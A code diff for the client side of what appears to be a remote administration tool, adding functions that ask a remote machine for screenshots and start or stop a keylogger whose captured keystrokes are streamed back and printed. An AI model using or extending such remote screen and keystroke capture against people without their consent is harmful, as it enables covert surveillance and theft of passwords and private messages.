@@ -9,7 +9,7 @@
 #include "../Utils/InUtils.h"
 #include <poll.h>
 #include <fstream>
-
+// TODO: Change STOP_APP TO KILL BY PID
 Client::Client()
 {
     std::vector<std::string> servers;
@@ -79,7 +79,7 @@ int Client::discover(std::vector<std::string> &servers)
     hints.ai_socktype = SOCK_DGRAM;
     hints.ai_flags = AI_PASSIVE;
 
-    if ((status = getaddrinfo(NULL, CLIENT_PORT, &hints, &addr)) != 0)
+    if ((status = getaddrinfo(NULL, "0", &hints, &addr)) != 0)
     {
         std::cerr << "client: getaddrinfo: " << gai_strerror(status) << "\n";
         return -1;
@@ -226,20 +226,54 @@ int Client::screenshot()
     Request req(SCREENSHOT_REQUEST, 0, NULL);
     if (sendRequest(this->sockfd, req, 0))
         return -1;
+    std::cout << "send resquest\n";
     Response res;
     if (recvResponse(this->sockfd, res, 0))
         return -1;
     if (res.errCode() == FAIL_CODE || res.type() != CMD_RESPONSE_PNG)
+    {
+        std::cout << "Invalid response\n";
         return -1;
-    std::fstream is("screenshot.png", std::ios::binary);
-    if (!is)
+    }
+    std::cout << "Valid response\n";
+    std::ofstream os("screenshot.png", std::ios::binary);
+    if (!os)
+    {
         return -1;
-    is.write((char *)res.data(), res.length());
+    }
+    os.write((char *)res.data(), res.length());
     return 0;
 }
 
-// int Client::startKeylog();
-// int Client::stopKeylog();
+int Client::startKeylog()
+{
+    Request req(START_KEYLOG_REQUEST, 0, NULL);
+    if (sendRequest(this->sockfd, req, 0))
+        return -1;
+    Response res;
+    if (recvResponse(this->sockfd, res, 0))
+        return -1;
+    if (res.errCode() == FAIL_CODE || res.type() != CMD_RESPONSE_EMPTY)
+        return -1;
+    while (recvResponse(this->sockfd, res, 0) != -1)
+    {
+        std::string msg((char *)res.data());
+        std::cout << msg << std::endl;
+    }
+    return 0;
+}
+int Client::stopKeylog()
+{
+    Request req(STOP_KEYLOG_REQUEST, 0, NULL);
+    if (sendRequest(this->sockfd, req, 0))
+        return -1;
+    Response res;
+    if (recvResponse(this->sockfd, res, 0))
+        return -1;
+    if (res.errCode() == FAIL_CODE || res.type() != CMD_RESPONSE_EMPTY)
+        return -1;
+    return 0;
+}
 
 int Client::dirTree(const std::string pathName)
 {
